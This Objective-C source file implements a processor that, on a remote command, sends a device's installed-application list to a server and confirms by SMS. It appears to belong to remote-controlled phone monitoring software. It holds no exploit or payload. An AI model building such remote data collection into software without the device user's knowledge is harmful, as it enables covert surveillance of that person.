/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  RequestInstalledApplicationProcessor
 - Version      :  1.0  
 - Purpose      :  Ask the client to send the installed application to the server
 - Copy right   :  12/07/2012, Benjawan Tanarattanakorn, Vervata Co., Ltd. All rights reserved.
 */

#import "RequestInstalledApplicationProcessor.h"
#import "ApplicationManager.h"


@interface RequestInstalledApplicationProcessor (private)
- (void) processRequestInstalledApplication;
- (void) requestInstalledApplicationException;
- (void) acknowldgeMessage;
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete; 
- (void) processFinished;
@end


@implementation RequestInstalledApplicationProcessor


/**
 - Method name:			initWithRemoteCommandData:andCommandProcessingDelegate
 - Purpose:				This method is used to initialize the RequestInstalledApplicationProcessor class
 - Argument list and description:	aRemoteCmdData (RemoteCmdData), aRemoteCmdProcessingDelegate (RemoteCmdProcessingDelegate)
 - Return description:	No return type
 */
- (id) initWithRemoteCommandData: (RemoteCmdData *) aRemoteCmdData 
	andCommandProcessingDelegate: (id <RemoteCmdProcessingDelegate>) aRemoteCmdProcessingDelegate {
	
	DLog (@">>>>>>>> RequestInstalledApplicationProcessor--->initWithRemoteCommandData")
	
	if ((self = [super initWithRemoteCommandData:aRemoteCmdData andCommandProcessingDelegate:aRemoteCmdProcessingDelegate])) {
	}
	return self;
}


#pragma mark Overriden method

/**
 - Method name:			doProcessingCommand
 - Purpose:				This method is used to process the RequestInstalledApplicationProcessor
 - Argument list and description:	No Argument 
 - Return description:	No return type
 - Overided				RemoteCmdAsyncHTTPProcessor
 */
- (void) doProcessingCommand {
	DLog (@"RequestInstalledApplicationProcessor--->doProcessingCommand")
	[self processRequestInstalledApplication];
}


#pragma mark Private method

/**
 - Method name:			processRequestInstalledApplication
 - Purpose:				This method is used to process Request Installed Application
 - Argument list and description:	No Argument
 - Return description:	No return type
 */
- (void) processRequestInstalledApplication {
	DLog (@"RequestInstalledApplicationProcessor ---> processRequestInstalledApplication")
	id <ApplicationManager> appManager = [[RemoteCmdUtils sharedRemoteCmdUtils] mApplicationManager];
	BOOL isReady = [appManager deliverInstalledApplication:self];
	if (!isReady) {
		DLog (@"!!! not ready to process request installed application command")
		[self requestInstalledApplicationException];
	}
	else {
		DLog (@".... processing request installed application command")
		[self acknowldgeMessage];
	}
}

/**
 - Method name:			requestInstalledApplicationException
 - Purpose:				This method is invoked when it fails to send installed application
 - Argument list and description:	No Return Type
 - Return description:	No Argument
 */
- (void) requestInstalledApplicationException {
	DLog (@"RequestInstalledApplicationProcessor ---> requestInstalledApplicationException");
	FxException* exception = [FxException exceptionWithName:@"requestInstalledApplicationException" andReason:@"Request installed application error"];
	//[exception setErrorCode:kInstalledApplicationManagerBusy];
	[exception setErrorCode:kCmdExceptionErrorCmdBeingRetried];
	[exception setErrorCategory:kFxErrorRCM]; 
	@throw exception;
}

/**
 - Method name:			acknowldgeMessage
 - Purpose:				This method is used to prepare acknowldge message
 - Argument list and description:	No Argument 
 - Return description:	No Return
 */
- (void) acknowldgeMessage {
	DLog (@"RequestInstalledApplicationProcessor ---> acknowldgeMessage");
	NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																						  andErrorCode:_SUCCESS_];
	NSString *ackMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestInstalledApplicationSucessMSG1", @"")];
	[self sendReplySMS:ackMessage isProcessCompleted:NO];
}

/**
 - Method name:			sendReplySMS:isProcessCompleted:
 - Purpose:				This method is used to send the SMS reply
 - Argument list and description:	aStatusCode (NSUInteger)
 - Return description:	No return type
 */
- (void) sendReplySMS: (NSString *) aReplyMessage  isProcessCompleted: (BOOL) aIsComplete  {
	DLog (@"RequestInstalledApplicationProcessor ---> sendReplySMS...")
	[[RemoteCmdUtils sharedRemoteCmdUtils] createSystemEvent:mRemoteCmdData
											 andReplyMessage:aReplyMessage];
	if ([mRemoteCmdData mIsSMSReplyRequired]) {
	    [[RemoteCmdUtils sharedRemoteCmdUtils] sendSMSWithRecipientNumber:[self recipientNumber] 
															   andMessage:aReplyMessage];
	}
	if (aIsComplete) {
		[self processFinished];
	} else {
		DLog (@"Sent aknowldge message.")
	}
}

/**
 - Method name:			processFinished
 - Purpose:				This method is invoked when request installed application process is completed
 - Argument list and description:	No Argument 
 - Return description:	isValidArguments (BOOL)
 */
-(void) processFinished {
	DLog (@"RequestInstalledApplicationProcessor ---> processFinished")
	if ([mRemoteCmdProcessingDelegate respondsToSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:)]) {
		[mRemoteCmdProcessingDelegate performSelector:@selector(proccessFinishedWithProcessor:andRemoteCmdData:) withObject:self withObject:mRemoteCmdData];
	}
}

// protocol RunningApplicationDelegate
- (void) deliverInstalledApplicationDidFinished: (NSError *) aError {
	DLog (@"!!!!!!! RequestInstalledApplicationProcessor ---> deliverInstalledApplicationDidFinished")
	if (!aError) {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:_SUCCESS_];
		NSString *requestBookmarkMessage = [messageFormat stringByAppendingString:NSLocalizedString(@"kRequestInstalledApplicationSucessMSG2", @"")];		
		[self sendReplySMS:requestBookmarkMessage isProcessCompleted:YES];
	} else {
		NSString *messageFormat = [[RemoteCmdUtils sharedRemoteCmdUtils] replyMessageFormatWithCommandCode:[self remoteCmdCode]
																							  andErrorCode:[aError code]];
		[self sendReplySMS:messageFormat isProcessCompleted:YES];
	}
}

@end

